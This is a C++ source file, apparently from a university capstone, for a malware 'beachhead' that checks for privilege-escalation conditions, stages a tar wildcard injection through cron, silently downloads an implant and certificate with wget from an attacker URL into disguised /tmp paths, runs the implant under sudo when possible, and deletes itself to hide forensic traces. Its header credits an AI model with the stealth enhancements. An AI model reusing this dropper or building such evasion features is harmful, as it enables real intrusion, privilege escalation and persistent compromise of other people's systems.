/*
 * COMPSCI564 - Cyber Effects Capstone Project
 * Beachhead - Initial Access Stage (Stealth-Enhanced)
 *
 * This version downloads the C++ implant binary and its TLS certificate,
 * attempts privilege escalation via tar wildcard injection, and then
 * executes the implant with sudo (if possible) or as the current user.
 *
 * AI Assistance Attribution:
 *   - Integration of sudo capability check
 *   - Download and execution of C++ implant
 *   - Stealth enhancements developed with Claude (Anthropic)
 *
 * For educational use in controlled lab environment only.
 */

#include <cstdlib>
#include <string>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <cstring>

#include "privesc_check.h"
#include "privesc.h"

// ----------------------------------------------------------------------
// Minimal logging (only when DEBUG is defined)
// ----------------------------------------------------------------------
static void log_status(const char* msg) {
#ifdef DEBUG
    size_t len = 0;
    while (msg[len]) len++;
    syscall(SYS_write, 2, msg, len);  // stderr
    syscall(SYS_write, 2, "\n", 1);
#endif
}

// ----------------------------------------------------------------------
// Check if current user can run sudo without a password
// Returns true if "sudo -n true" succeeds, false otherwise.
// ----------------------------------------------------------------------
static bool can_sudo_nopasswd() {
    // fork and exec sudo -n true
    pid_t pid = syscall(SYS_fork);
    if (pid < 0) return false;

    if (pid == 0) {
        // child: redirect stdout/stderr to /dev/null
        int devnull = syscall(SYS_open, "/dev/null", O_WRONLY);
        if (devnull >= 0) {
            syscall(SYS_dup2, devnull, 1);  // stdout
            syscall(SYS_dup2, devnull, 2);  // stderr
            syscall(SYS_close, devnull);
        }
        const char* argv[] = { "sudo", "-n", "true", nullptr };
        syscall(SYS_execve, "/usr/bin/sudo", argv, nullptr);
        syscall(SYS_exit, 1);  // execve failed
    } else {
        // parent: wait for child
        int status;
        syscall(SYS_wait4, pid, &status, 0, nullptr);
        return (WIFEXITED(status) && WEXITSTATUS(status) == 0);
    }
}

// ----------------------------------------------------------------------
// Download a file using wget (quiet, no output)
// ----------------------------------------------------------------------
static bool download_file(const char* url, const char* dest) {
    pid_t pid = syscall(SYS_fork);
    if (pid < 0) return false;

    if (pid == 0) {
        // child: run wget -q url -O dest
        int devnull = syscall(SYS_open, "/dev/null", O_WRONLY);
        if (devnull >= 0) {
            syscall(SYS_dup2, devnull, 1);
            syscall(SYS_dup2, devnull, 2);
            syscall(SYS_close, devnull);
        }
        const char* argv[] = { "wget", "-q", url, "-O", dest, nullptr };
        syscall(SYS_execve, "/usr/bin/wget", argv, nullptr);
        syscall(SYS_exit, 1);
    } else {
        int status;
        syscall(SYS_wait4, pid, &status, 0, nullptr);
        return (WIFEXITED(status) && WEXITSTATUS(status) == 0);
    }
}

// ----------------------------------------------------------------------
// Main entry point
// ----------------------------------------------------------------------
int main() {
    // ====================================================================
    // STAGE 1: Pre‑escalation reconnaissance (stealth‑enhanced)
    // ====================================================================
    log_status("[*] Stage 1: Checking privilege escalation conditions...");

    PrivEscConditions cond = check_privesc_viability();

#ifdef DEBUG
    // Build debug output manually (avoid snprintf)
    char debug_msg[256] = "[*] UID: ";
    int pos = 9;

    // Convert UID to string
    unsigned int uid = cond.current_uid;
    char uid_str[16];
    int uid_len = 0;
    if (uid == 0) {
        uid_str[uid_len++] = '0';
    } else {
        char tmp[16];
        int tpos = 0;
        while (uid > 0) {
            tmp[tpos++] = '0' + (uid % 10);
            uid /= 10;
        }
        for (int i = tpos - 1; i >= 0; i--)
            uid_str[uid_len++] = tmp[i];
    }
    uid_str[uid_len] = '\0';
    for (int i = 0; i < uid_len; i++) debug_msg[pos++] = uid_str[i];

    const char* suffix = " | Backups writable: ";
    for (int i = 0; suffix[i]; i++) debug_msg[pos++] = suffix[i];
    const char* writable = cond.backups_dir_writable ? "YES" : "NO";
    for (int i = 0; writable[i]; i++) debug_msg[pos++] = writable[i];

    suffix = " | Tar: ";
    for (int i = 0; suffix[i]; i++) debug_msg[pos++] = suffix[i];
    const char* tar = cond.tar_available ? "YES" : "NO";
    for (int i = 0; tar[i]; i++) debug_msg[pos++] = tar[i];

    suffix = " | Cron: ";
    for (int i = 0; suffix[i]; i++) debug_msg[pos++] = suffix[i];
    const char* cron = cond.cron_running ? "YES" : "NO";
    for (int i = 0; cron[i]; i++) debug_msg[pos++] = cron[i];

    debug_msg[pos] = '\0';
    log_status(debug_msg);
#endif

    // ====================================================================
    // STAGE 2: Attempt privilege escalation (if conditions are met)
    // ====================================================================
    bool should_escalate = cond.backups_dir_writable &&
                           cond.tar_available &&
                           cond.cron_running &&
                           cond.current_uid != 0;

    if (should_escalate && !can_sudo_nopasswd()) {
        log_status("[*] Stage 2: Attempting privilege escalation...");
        if (execute_tar_privesc() == 0) {
            log_status("[+] Privilege escalation staged. Waiting for cron...");
            // Wait up to 75 seconds for the cron job to run
            for (int i = 0; i < 15; i++) {
                struct timespec ts = {5, 0};  // 5 seconds
                syscall(SYS_nanosleep, &ts, nullptr);
                if (can_sudo_nopasswd()) {
                    log_status("[+] Successfully gained sudo privileges!");
                    break;
                }
            }
        } else {
            log_status("[!] Privilege escalation setup failed");
        }
    } else if (cond.current_uid == 0) {
        log_status("[+] Already running as root");
    } else if (can_sudo_nopasswd()) {
        log_status("[+] Already have sudo access");
    } else {
        log_status("[!] Privilege escalation conditions not met, proceeding anyway");
    }

    // ====================================================================
    // STAGE 3: Download the C++ implant and its TLS certificate
    // ====================================================================
    log_status("[*] Stage 3: Downloading implant and certificate...");

    // Implant binary location (defined via -DURL in Makefile)
    const char* implant_url = URL;
    // Certificate location (derived from URL, e.g., http://.../cert.pem)
    // We assume the attacker serves cert.pem at the same base URL.
    std::string cert_url_str = URL;
    size_t last_slash = cert_url_str.rfind('/');
    if (last_slash != std::string::npos)
        cert_url_str = cert_url_str.substr(0, last_slash + 1) + "cert.pem";
    else
        cert_url_str = "cert.pem";
    const char* cert_url = cert_url_str.c_str();

    const char* implant_path = "/tmp/systemd-private-update"; // final implant binary
    const char* cert_path = "/tmp/index.html";               // certificate for TLS

    if (!download_file(implant_url, implant_path)) {
        log_status("[!] Failed to download implant");
        return 1;
    }

    if (!download_file(cert_url, cert_path)) {
        log_status("[!] Failed to download certificate (continuing anyway)");
        // Not fatal – implant may still work if it has certificate elsewhere
    }

    // Make the implant executable
    syscall(SYS_chmod, implant_path, 0755);

    log_status("[+] Implant and certificate downloaded");

    // ====================================================================
    // STAGE 4: Execute the implant with elevated privileges (if possible)
    // ====================================================================
    log_status("[*] Stage 4: Executing implant...");

    pid_t child_pid = syscall(SYS_fork);
    if (child_pid < 0) {
        log_status("[!] Fork failed");
        return 1;
    }

    if (child_pid == 0) {
        // Child: redirect output to /dev/null and exec implant
        int devnull = syscall(SYS_open, "/dev/null", O_WRONLY);
        if (devnull >= 0) {
            syscall(SYS_dup2, devnull, 1);
            syscall(SYS_dup2, devnull, 2);
            syscall(SYS_close, devnull);
        }

        // Decide how to launch: sudo if we have passwordless sudo, else direct
        if (can_sudo_nopasswd()) {
            const char* argv[] = { "sudo", "-n", implant_path, nullptr };
            syscall(SYS_execve, "/usr/bin/sudo", argv, nullptr);
        } else {
            const char* argv[] = { implant_path, nullptr };
            syscall(SYS_execve, implant_path, argv, nullptr);
        }

        // If we get here, exec failed
        syscall(SYS_exit, 1);
    } else {
        // Parent continues – implant is now running in background
        log_status("[+] Implant launched");
    }

    // ====================================================================
    // CLEANUP: Remove beachhead artifacts (unless DEBUG is defined)
    // ====================================================================
#ifndef DEBUG
    // Self‑delete the beachhead binary to reduce forensic footprint
    syscall(SYS_unlink, "/proc/self/exe");
#endif

    return 0;
}
